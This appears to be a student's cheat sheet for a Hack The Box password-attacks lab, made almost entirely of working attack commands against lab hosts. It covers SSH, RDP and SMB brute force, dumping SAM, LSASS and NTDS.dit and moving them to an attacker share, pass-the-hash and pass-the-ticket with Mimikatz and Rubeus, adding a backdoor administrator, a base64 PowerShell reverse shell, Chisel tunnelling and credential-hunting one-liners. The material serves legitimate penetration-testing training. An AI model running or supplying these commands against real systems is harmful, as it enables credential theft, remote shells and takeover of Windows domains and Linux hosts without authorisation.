#### Cryptographic Hash Methods
| **ID**   | **Cryptographic Hash Algorithm** |
| -------- | -------------------------------- |
| `$1$`    | MD5                              |
| `$2a$`   | Blowfish                         |
| `$5$`    | SHA-256                          |
| `$6$`    | SHA-512                          |
| `$sha1$` | SHA1crypt                        |
| `$y$`    | Yescrypt                         |
| `$gy$`   | Gost-yescrypt                    |
| `$7$`         |  Scrypt                                |


## John The Ripper

### Cracking Modes

#### Single Crack Mode
```Shell
john --format=<hash_type> <hash or hash_file>
```

```Shell
john --format=sha256 hashes_to_crack.txt
```

John will output the cracked passwords to the console and the file "john.pot" (`~/.john/john.pot`) in the current directory

#### Wordlist Mode
```Shell
john --wordlist=<wordlist_file> --rules <hash_file>
```

#### Incremental Mode
```Shell
john --incremental <hash_file>
```
Will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes.

### Cracking Files

#### Cracking Files with John
```Shell
<tool> <file_to_crack> > file.hash
```

```Shell
pdf2john server_doc.pdf > server_doc.hash
```

```Shell
john server_doc.hash
```
`#OR`
```Shell
john --wordlist=<wordlist.txt> server_doc.hash
```

#### Location of 2john tools
```Shell
locate *2john*
```


## Network Services

### WinRM

#### CrackMapExec Protocol Specific Help
```Shell
crackmapexec smb -h
```

#### CrackMapExec against WinRM
```Shell
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

#### Using Evil-WinRM
```Shell
evil-winrm -i 10.129.42.197 -u user -p password
```

### SSH

#### Hydra - SSH
```Shell
hydra -L user.list -P password.list ssh://10.129.42.197
```

### RDP

#### Hydra - RDP
```Shell
hydra -L user.list -P password.list rdp://10.129.42.197
```

#### Logging in over xFreeRDP
```Shell
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

```Shell
xfreerdp /v:10.129.42.197 /u:user /p:password
```

### SMB

#### Hydra - SMB
```Shell
hydra -L user.list -P password.list smb://10.129.42.197
```

#### Metasploit - SMB
```Shell
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

#### CrackMapExec - SMB
```Shell
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

#### Smbclient
```Shell
smbclient -U user \\\\10.129.42.197\\SHARENAME
```


## Password Mutations

[WPengine](https://wpengine.com/resources/passwords-unmasked-infographic/)

#### Generating a Rule-based Wordlist using Hashcat
```Shell
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

#### Examining Exisiting Rules in Hashcat
```cmd.exe
dir C:\Program Files (x86)\hashcat-6.2.5\rules
```

#### Generating Wordlists Using CeWL
```Shell
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## Password Reuse / Default Passwords

[Default Credentials Cheatsheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
[Default Router Login Password For Top Router Models](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

#### Credential Stuffing - Hydra Syntax
```Shell
hydra -C <user_pass.list> <protocol>://<IP>
```

#### Credential Stuffing - Hydra
```Shell
hydra -C user_pass.list ssh://10.129.42.197
```


## Attacking SAM

#### Using reg.exe save to Copy Registry Hives
```cmd.exe
reg.exe save hklm\sam C:\sam.save
```

```cmd.exe
reg.exe save hklm\system C:\system.save
```

```cmd.exe
reg.exe save hklm\security C:\security.save
```

#### Creating a Share with smbserver.py
```Shell
smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

#### Moving Hive Copies to Share
```cmd.exe
move sam.save \\10.10.15.16\CompData
```

```cmd.exe
move security.save \\10.10.15.16\CompData
```

```cmd.exe
move system.save \\10.10.15.16\CompData
```
Then we can confirm that our hive copies successfully moved to the share by navigating to the shared directory on our attack host and using ls to list the files.

### Dumping Hashes with Impacket's secretsdump.py

#### Running secretsdump.py
```Shell
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

#### Running Hashcat against NT Hashes
```cmd.exe
hashcat -m 1000 hashestocrack.txt rockyou.txt
```
#### Dumping NTDS.dit locally
```Shell
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```
### Remote Dumping & LSA Secrets Considerations

#### Dumping LSA Secrets Remotely
```Shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Dumping SAM Remotely
```Shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```


## Attacking LSASS

### Dumping LSASS Process Memory

#### Task Manager Method
![[Pasted image 20230305105100.png]]
A file called lsass.DMP is created and saved in: `C:\Users\loggedonusersdirectory\AppData\Local\Temp`

### Rundll32.exe & Comsvcs.dll Method (No-GUI)

#### Finding LSASS PID in cmd
```cmd.exe
tasklist /svc
```

#### Finding LSASS PID in PowerShell
```PowerShell
Get-Process lsass
```

#### Creating lsass.dmp using PowerShell
```PowerShell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

*Note: We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.*

### Using Pypykatz to Extract Credentials

#### Running Pypykatz
```Shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

#### Dissecting the Outputs:
- MSV: an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database
- WDIGEST: an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text.
- Kerberos: a network authentication protocol used by Active Directory in Windows Domain environments. Consists of tickets. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
- DPAPI: a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications (e.g., Internet Explorer, Google Chrome, Outlook, Remote Desktop Connection, Credential Manager)

#### Cracking the NT Hash with Hashcat
```Shell
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
```


## Attacking Active Directory & NTDS.dit

#### Using [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats
```Shell
username-anarchy -i /home/ltnbob/names.txt 
```

#### Launching the Attack with CrackMapExec
```Shell
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

### Capturing NTDS.dit

#### Connecting to a DC with Evil-WinRM
```Shell
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

#### Checking Local Group Membership using Evil-WinRM
```PowerShell
net localgroup
```

#### Checking User Account Privileges including Domain using Evil-WinRM
```PowerShell
net user bwilliamson
```

#### Creating Shadow Copy of C: using Evil-WinRM
```PowerShell
vssadmin CREATE SHADOW /For=C:
```

#### Copying NTDS.dit from the VSS using Evil-WinRM
```PowerShell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

#### Transferring NTDS.dit to Attack Host using Evil-WinRM
```PowerShell
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

### A Faster Method: Using cme to Capture NTDS.dit

#### CrackMapExec command to capture NTDS.dit
```Shell
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Hash Cracking

#### Cracking a Single Hash with Hashcat
```cmd.exe
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
```

### Pass-the-Hash Considerations

#### Pass-the-Hash with Evil-WinRM
```Shell
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


## Credential Hunting in Windows

### Search Centric

#### Key Terms to Search

<input type="checkbox" /> Passwords
<input type="checkbox" /> Username
<input type="checkbox" /> Users
<input type="checkbox" /> Configuration
<input type="checkbox" /> pwd
<input type="checkbox" /> Passphrases
<input type="checkbox" /> User account
<input type="checkbox" /> Passkeys
<input type="checkbox" /> dbcredential
<input type="checkbox" /> Login
<input type="checkbox" /> Keys
<input type="checkbox" /> Creds
<input type="checkbox" /> Passphrases
<input type="checkbox" /> dbpassword
<input type="checkbox" /> Credentials

### Search Tools

#### `Windows Search`
![[Pasted image 20230305111735.png]]

#### Running Lazagne All
```cmd.exe
start lazagne.exe all
```

#### Using findstr
```Shell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Here are some other places we should keep in mind when credential hunting:

    Passwords in Group Policy in the SYSVOL share
    Passwords in scripts in the SYSVOL share
    Password in scripts on IT shares
    Passwords in web.config files on dev machines and IT shares
    unattend.xml
    Passwords in the AD user or computer description fields
    KeePass databases --> pull hash, crack and get loads of access.
    Found on user systems and shares
    Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint


## Credential Hunting in Linux

<input type="checkbox" /> Configuration Files
<input type="checkbox" /> Databases
<input type="checkbox" /> Notes
<input type="checkbox" /> Scripts
<input type="checkbox" /> Cronjobs
<input type="checkbox" /> SSH Keys (Private and Public)
<input type="checkbox" /> History
<input type="checkbox" /> Logs
<input type="checkbox" /> Memory and Cache
<input type="checkbox" /> Browsers

### Configuration Files 

#### Searching Configuration Files
```Shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

#### Searching Credentials in Configuration Files
```Shell
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Databases

#### Searching Databases
```Shell
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Notes

#### Searching Notes
```Shell
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts 

#### Searching Scripts
```Shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Cronjobs

#### Searching Cronjobs
```Shell
cat /etc/crontab
```

```Shell
ls -la /etc/cron.*/
```

### SSH Keys

#### Searching SSH Private Keys
```Shell
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

#### Searching SSH Public Keys
```Shell
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### History

#### Searching Bash History
```Shell
tail -n5 /home/*/.bash*
```

### Logs

#### Searching Logs
```Shell
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Memory and Cache

#### Searching Memory and Cache with [mimipenguin.py](https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.py)
```Shell
sudo python3 mimipenguin.py
```

#### Searching Memory and Cache with [mimipenguin.sh](https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh)
```Shell
sudo bash mimipenguin.sh
```

#### Searching Memory - LaZagne
```Shell
sudo python2.7 laZagne.py all
```

### Browsers

#### Firefox Stored Credentials
```Shell
ls -l .mozilla/firefox/ | grep default
```

```Shell
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

#### Decrypting Firefox Credentials
```Shell
python3.9 firefox_decrypt.py
```
It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.

#### Browsers - LaZagne
```Shell
python3 laZagne.py browsers
```


## Passwd, Shadow & Opasswd

### Passwd File

<input type="checkbox" /> Determine if `/etc/passwd` is writeable
<input type="checkbox" /> See if Shadow File is accessible
<input type="checkbox" /> See if `/etc/security/opasswd` is readable
<input type="checkbox" /> Crack hashes
<input type="checkbox" /> Check for credential re-use

#### Editing /etc/passwd - Before
```Shell
root:x:0:0:root:/root:/bin/bash
```

#### Editing /etc/passwd - After
```Shell
root::0:0:root:/root:/bin/bash
```
Usually, we find the value `x` in this field, which means that the passwords are stored in an encrypted form in the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to clear this field for the user `root` so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.

#### Log in as Root w/o Password
```Shell
head -n 1 /etc/passwd
```
If: root::0:0:root:/root:/bin/bash
`Then:`
```Shell
su
```

### Shadow File

Algorithm Types in Shadow File

- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

### Opasswd

#### Reading /etc/security/opasswd
```Shell
sudo cat /etc/security/opasswd
```


### Cracking Linux Credentials

#### Unshadow
```Shell
cp /etc/passwd /tmp/passwd.bak
```

```Shell
cp /etc/shadow /tmp/shadow.bak
```

```Shell
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes
```Shell
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### Hashcat - Cracking MD5 Hashes
```Shell
cat md5-hashes.list
```

```Shell
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```


## Pass-the-Hash - Windows

#### Pass-the-Hash from Windows Using Mimikatz
```cmd.exe
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
`/user` - The user name we want to impersonate
`/rc4` or `/NTLM` - NTLM hash of the user's password
`/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (`.`)
`/run` - The program we want to run with the user's context (if not specified, it will launch `cmd.exe`)

*Now we can use cmd.exe to execute commands in the user's context*

### Pass the Hash with PowerShell Invoke-TheHash (Windows)

#### Invoke-TheHash with SMB
```PowerShell
cd C:\tools\Invoke-TheHash\
```

```PowerShell
Import-Module .\Invoke-TheHash.psd1
```

```PowerShell
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#### Netcat Listener
```PowerShell
.\nc.exe -lvnp 8001
```

#### Create a simple reverse shell for PowerShell using https://www.revshells.com/
![[Pasted image 20230305140313.png]]
Set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`

#### Invoke-TheHash with WMI to execute our PowerShell reverse shell script in the target computer
```PowerShell
Import-Module .\Invoke-TheHash.psd1
```

```PowerShell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQB<..SNIP..>=="
```
The result is a reverse shell connection from the `DC01` host (`172.16.1.10`)

![[Pasted image 20230305140533.png]]


## Pass-the-Hash - Linux

### Impacket PsExec

#### Pass the Hash with Impacket PsExec
```Shell
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

May also use:

- impacket-wmiexec
- impacket-atexec
- impacket-smbexec

### CrackMapExec

#### Pass the Hash with CrackMapExec
```Shell
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command

#### CrackMapExec - Command Execution
```Shell
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Evil-WinRM

#### Pass the Hash with evil-winrm
```Shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### RDP (Linux)

#### Enable Restricted Admin Mode to Allow PtH
```cmd.exe
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Pass-the-Hash Using RDP
```Shell
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


## Pass the Ticket (PtT) Attack (Windows)

### Harvesting Kerberos Tickets from Windows

#### Mimikatz - Export Tickets
```cmd.exe
mimikatz.exe
```

```cmd.exe
privilege::debug
```

```cmd.exe
sekurlsa::tickets /export
```

```cmd.exe
exit
```

```cmd.exe
dir *.kirbi
```
*Note: If you pick a ticket with the service `krbtgt`, it corresponds to the TGT of that account.*

### Rubeus - Export Tickets
```cmd.exe
Rubeus.exe dump /nowrap
```

*Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator*

### Pass the Key or OverPass the Hash

#### Mimikatz - Extract Kerberos Keys
```cmd.exe
mimikatz.exe
```

```cmd.exe
privilege::debug
```

```cmd.exe
sekurlsa::ekeys
```
Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`

#### Mimikatz - Pass the Key or OverPass the Hash
```cmd.exe
mimikatz.exe
```

```cmd.exe
privilege::debug
```

```cmd.exe
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user

#### Rubeus - Pass the Key or OverPass the Hash
```cmd.exe
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

***Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.***

### Pass-the-Ticket (PtT)

#### Rubeus Pass-the-Ticket
```cmd.exe
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

#### Rubeus - Pass-the-Ticket using a ticket exported from Mimikatz
```cmd.exe
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

#### Using PowerShell to convert a .kirbi to base64
```PowerShell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

#### Pass-the-Ticket w/ Rubeus providing the base64 string instead of the file name
```cmd.exe
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

#### Mimikatz - Pass-the-Ticket
```cmd.exe
mimikatz.exe
```

```cmd.exe
privilege::debug
```

```cmd.exe
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

### Mimikatz - PowerShell Remoting with Pass the Ticket

#### Mimikatz - Pass the Ticket for Lateral Movement
```cmd.exe
mimikatz.exe
```

```cmd.exe
privilege::debug
```

```cmd.exe
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```cmd.exe
exit
```

```cmd.exe
Enter-PSSession -ComputerName DC01
```

```cmd.exe
whoami
```

```cmd.exe
hostname
```

### Rubeus - PowerShell Remoting with Pass the Ticket

#### Create a Sacrificial Process with Rubeus
```cmd.exe
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

#### Rubeus - Pass the Ticket for Lateral Movement
```cmd.exe
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

```cmd.exe
powershell
```

```cmd.exe
Enter-PSSession -ComputerName DC01
```

```cmd.exe
whoami
```

```cmd.exe
hostname
```


## Pass the Ticket (PtT) from Linux

### Identifying Linux and Active Directory Integration

#### realm - Check If Linux Machine is Domain Joined
```Shell
realm list
```

#### sssd or winbind - Check if Linux Machine is Domain Joined
```Shell
ps -ef | grep -i "winbind\|sssd"
```

### Finding Kerberos Tickets in Linux

#### Using Find to Search for Files with Keytab in the Name
```Shell
find / -name *keytab* -ls 2>/dev/null
```
*Note: To use a keytab file, we must have read and write (rw) privileges on the file.*

#### Identifying Keytab Files in Cronjobs
```Shell
crontab -l
```
kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.

***Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB*

#### Reviewing Environment Variables for ccache Files
```Shell
env | grep -i krb5
```
ccache files are located, by default, at `/tmp`

#### Searching for ccache Files in /tmp
```Shell
ls -la /tmp
```

### Abusing KeyTab Files

#### Listing keytab File Information
```Shell
klist -k -t
```
*Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist*

#### Impersonating a User with a keytab
```Shell
klist
```

```Shell
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

```Shell
klist
```

#### Connecting to SMB Share as Carlos (from target host)
```Shell
smbclient //dc01/carlos -k -c ls
```

***Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.*

### Keytab Extract

#### Extracting Keytab Hashes with KeyTabExtract
```Shell
python3 keytabextract.py /opt/specialfiles/carlos.keytab 
```
With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

***Note: A keypass file can contain different types of hashes and can be merged to contain multiple credentials even from different users.*

https://crackstation.net/

#### Log in as user
```Shell
su - carlos@inlanefreight.htb
```

Extract all the hashes from all the keytabs

### Abusing Keytab ccache

#### Privilege Escalation to Root
```Shell
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
```

```Shell
sudo -l
```

```Shell
sudo su
```

#### Looking for ccache Files
```Shell
ls -la /tmp
```

#### Identifying Group ZMembership with the id Command
```Shell
id julio@inlanefreight.htb
```

#### Importing the ccache File into our Current Session
```Shell
klist
```

```Shell
cp /tmp/krb5cc_647401106_I8I133 .
```

```Shell
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

```Shell
klist
```

```Shell
smbclient //dc01/C$ -k -c ls -no-pass
```
*Note: klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work.*

### Using Linux Attack Tools with Kerberos

#### Host File Modified
```Shell
cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

#### Proxychains Configuration File
```Shell
cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

#### Download Chisel to the Attack Host
```Shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

```Shell
gzip -d chisel_1.7.7_linux_amd64.gz
```

```Shell
mv chisel_* chisel && chmod +x ./chisel
```

#### Start Chisel on Attack Host
```Shell
chisel server --reverse
```

#### Connect to MS01 with xfreerdp
```Shell
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

#### Execute Chisel from MS01
```cmd.exe
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
*Note: The client IP is your attack host IP.*

#### Transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file
```Shell
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impacket

#### Using Impacket with proxychains and Kerberos Authentication
```Shell
proxychains impacket-wmiexec ms01 -k
```

***Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.***

### Evil-WinRM

#### Installing Kerberos Authentication Package
```Shell
apt-get install krb5-user -y
```

#### Kerberos Configuration File for INLANEFREIGHT.HTB
```Shell
cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

#### Using Evil-WinRM with Kerberos
```Shell
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Miscellaneous

#### Impacket Ticket Converter
```Shell
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
If we want to use a ccache file in Windows or a kirbi file in a Linux machine. Specify the file we want to convert and the output filename.

#### Importing Converted Ticket into Windows Session with Rubeus
```cmd.exe
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

### Linikatz

#### Linikatz Download and Execution
```Shell
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

```Shell
./linukatz.sh
```


## Protected Files

#### Hunting for Encoded Files
```Shell
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

#### Hunting for SSH Keys
```Shell
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

#### Encrypted SSH Keys
```Shell
cat /home/cry0l1t3/.ssh/SSH.private
```
Most SSH keys we will find nowadays are encrypted. We can recognize this by the header of the SSH key because this shows the encryption method in use.

### Cracking with John

#### John Hashing Scripts
```Shell
locate *2john*
```

#### Generate the corresponding hashes for encrypted SSH keys
```Shell
ssh2john.py SSH.private > ssh.hash
```

```Shell
cat ssh.hash 
```

#### Cracking SSH Keys
```Shell
john --wordlist=rockyou.txt ssh.hash
```

```Shell
john ssh.hash --show
```

### Cracking Documents

#### Cracking Microsoft Office Documents
```Shell
office2john.py Protected.docx > protected-docx.hash
```

```Shell
cat protected-docx.hash
```

```Shell
john --wordlist=rockyou.txt protected-docx.hash
```

```Shell
john protected-docx.hash --show
```

#### Cracking PDFs
```Shell
pdf2john.py PDF.pdf > pdf.hash
```

```Shell
cat pdf.hash
```

```Shell
john --wordlist=rockyou.txt pdf.hash
```

```Shell
john pdf.hash --show
```

[FileInfo.com](https://fileinfo.com/filetypes/compressed)

#### Download all File Extensions
```Shell
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

### Cracking Archives

#### Cracking ZIP using zip2john
```Shell
zip2john ZIP.zip > zip.hash
```

#### Viewing the Contents of zip.hash
```Shell
cat zip.hash
```

#### Cracking the Hash with John
```Shell
john --wordlist=rockyou.txt zip.hash
```

#### Viewing the Cracked Hash
```Shell
john zip.hash --show
```

### Cracking OpenSLL Encrypted Archives

#### Listing the files
```Shell
ls

GZIP.gzip  rockyou.txt
```

#### Using file
```Shell
file GZIP.gzip
```

#### Using a for-loop to Display Extracted Contents
```Shell
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

### Cracking BitLocker Encrypted Drives

#### Using bitlocker2john
```Shell
bitlocker2john -i Backup.vhd > backup.hashes
```

```Shell
grep "bitlocker\$0" backup.hashes > backup.hash
```

```Shell
cat backup.hash
```

#### Using hashcat to Crack backup.hash
```Shell
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```

#### Windows - Mounting BitLocker VHD
The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it. To do this, we only have to double-click on the virtual drive. Since it is password protected, Windows will show us an error. After mounting, we can again double-click BitLocker to prompt us for the password.
![[Pasted image 20230307160310.png]]
